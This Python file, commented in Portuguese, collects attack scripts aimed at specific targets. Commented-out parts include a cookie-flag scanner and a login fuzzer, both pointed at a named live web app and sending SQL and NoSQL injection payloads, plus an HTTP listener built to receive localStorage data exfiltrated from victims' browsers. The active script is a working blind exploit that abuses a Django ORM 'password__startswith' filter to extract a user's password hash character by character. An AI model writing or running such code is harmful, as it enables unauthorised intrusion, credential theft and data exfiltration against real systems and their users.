#import requests
#
## Lista de URLs encontradas pelo seu scanner
#urls = [
#    "https://maestro-drive.lovable.app/~api/analytics",
#    "https://maestro-drive.lovable.app/login",
#    "https://maestro-drive.lovable.app/precos",
#    "https://maestro-drive.lovable.app/"
#]
#
#def analyze_cookies(url):
#    print(f"\n[+] Analisando: {url}")
#    try:
#        # Simulando um User-Agent de navegador para evitar bloqueios simples
#        headers = {'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36'}
#        response = requests.get(url, headers=headers, timeout=10)
#        
#        if not response.cookies:
#            # Tentar um POST no login caso o GET não sete cookies
#            if "login" in url:
#                response = requests.post(url, headers=headers, timeout=10)
#            
#        if response.cookies:
#            for cookie in response.cookies:
#                print(f"    Cookie encontrado: {cookie.name}")
#                
#                # Teste da flag HttpOnly (Proteção contra XSS)
#                if cookie.has_nonstandard_attr('HttpOnly') or 'HttpOnly' in str(cookie):
#                    print("    [SAFE] HttpOnly: Presente")
#                else:
#                    print("    [v] VULNERÁVEL: HttpOnly ausente! (O XSS que discutimos pode roubar este cookie)")
#
#                # Teste da flag Secure (Proteção contra Man-in-the-Middle)
#                if cookie.secure:
#                    print("    [SAFE] Secure: Presente")
#                else:
#                    print("    [v] VULNERÁVEL: Secure ausente! (Cookie pode ser enviado via HTTP inseguro)")
#                
#                # Teste da flag SameSite (Proteção contra CSRF)
#                samesite = cookie.get_nonstandard_attr('SameSite')
#                if samesite:
#                    print(f"    [INFO] SameSite: {samesite}")
#                else:
#                    print("    [v] AVISO: SameSite ausente (Risco potencial de CSRF)")
#        else:
#            print("    [-] Nenhum cookie Set-Cookie encontrado nesta requisição.")
#            
#    except Exception as e:
#        print(f"    [!] Erro ao conectar: {e}")
#
#if __name__ == "__main__":
#    for target in urls:
#        analyze_cookies(target)


#from http.server import BaseHTTPRequestHandler, HTTPServer
#import base64
#
#class Receptor(BaseHTTPRequestHandler):
#    def do_GET(self):
#        print("\n" + "="*50)
#        print(f"[!] DADOS RECEBIDOS DE: {self.client_address[0]}")
#        
#        # O dado virá após a barra '/' em Base64
#        try:
#            encoded_data = self.path[1:]
#            if encoded_data:
#                decoded_data = base64.b64decode(encoded_data).decode('utf-8')
#                print(f"[+] LOCALSTORAGE CAPTURADO:\n{decoded_data}")
#            else:
#                print("[-] Nenhuma carga útil recebida.")
#        except Exception as e:
#            print(f"[-] Erro ao decodificar: {e} | Bruto: {self.path}")
#        
#        print("="*50 + "\n")
#        
#        # Responde 200 pro navegador não suspeitar
#        self.send_response(200)
#        self.end_headers()
#        self.wfile.write(b"OK")
#
#if __name__ == "__main__":
#    server_address = ('', 8080) # Porta 8080
#    httpd = HTTPServer(server_address, Receptor)
#    print("[*] Aguardando exfiltração de dados na porta 8080...")
#    httpd.serve_forever()


#import requests
#
#url = "https://maestro-drive.lovable.app/login" # Ajuste se o endpoint da API for diferente
#
## Diferentes tipos de conteúdo para testar como o backend processa
#content_types = [
#    "application/json",
#    "application/x-www-form-urlencoded",
#    "text/xml",
#    "application/xml",
#    "application/vnd.api+json"
#]
#
## Payloads de teste
#payloads = [
#    {"email": "admin@maestro.com", "password": "' OR 1=1 --"}, # SQLi básico
#    {"email": {"$gt": ""}, "password": {"$gt": ""}},           # NoSQLi básico
#    '{"email": "test@test.com", "password": "123"}' * 100,      # Buffer Overflow test
#    "email=admin@test.com&password=password123"                # Form data
#]
#
#def perform_fuzz():
#    print(f"[*] Iniciando Fuzzing em {url}...\n")
#    
#    for ct in content_types:
#        for p in payloads:
#            headers = {'Content-Type': ct, 'User-Agent': 'HackerAI-Scanner'}
#            try:
#                # Testando POST
#                res = requests.post(url, headers=headers, data=str(p), timeout=5)
#                
#                print(f"[TYPE: {ct}] | Status: {res.status_code} | Tamanho: {len(res.text)}")
#                
#                # Se o servidor responder algo diferente de 400 ou 404, pode ser interessante
#                if res.status_code in [200, 500]:
#                    print(f"    [!] Comportamento interessante detectado com CT: {ct}")
#                    if "error" in res.text.lower():
#                        print(f"    [Detelhes]: {res.text[:100]}") # Ver erros detalhados
#                        
#            except requests.exceptions.RequestException as e:
#                print(f"[!] Erro na conexão: {e}")
#
#if __name__ == "__main__":
#    perform_fuzz()

import requests
import string

# Configurações do ambiente
TARGET_URL = "http://172.16.2.32/list" # Ajuste para a URL que aponta para a UserView
TARGET_USER = "Vidar"
# Conjunto de caracteres comuns em hashes do Django (PBKDF2/Argon2)
CHARSET = string.ascii_letters + string.digits + "+/=$." 

def get_csrf_token(session):
    """Captura o token CSRF necessário para o POST no Django."""
    response = session.get(TARGET_URL)
    return response.cookies.get('csrftoken')

def exploit():
    session = requests.Session()
    discovered_hash = ""
    print(f"[*] Iniciando extração do hash para: {TARGET_USER}")

    while True:
        found_char = False
        csrf = get_csrf_token(session)
        
        for char in CHARSET:
            # O lookup '__startswith' é a chave para extração cega
            payload = {
                "username": TARGET_USER,
                "password__startswith": discovered_hash + char
            }
            
            headers = {
                "X-CSRFToken": csrf,
                "Referer": TARGET_URL,
                "Content-Type": "application/json"
            }

            try:
                # Enviamos o filtro malicioso via POST
                response = session.post(TARGET_URL, json=payload, headers=headers)
                
                # Se a resposta contiver dados (len > 2 pq não é apenas '[]'), o char está correto
                if len(response.json()) > 0:
                    discovered_hash += char
                    print(f"[+] Hash encontrado: {discovered_hash}")
                    found_char = True
                    break
            except Exception as e:
                continue
        
        if not found_char:
            print("[*] Fim da extração ou caractere não encontrado.")
            break

    print(f"\n[!] Extração concluída: {discovered_hash}")

if __name__ == "__main__":
    exploit()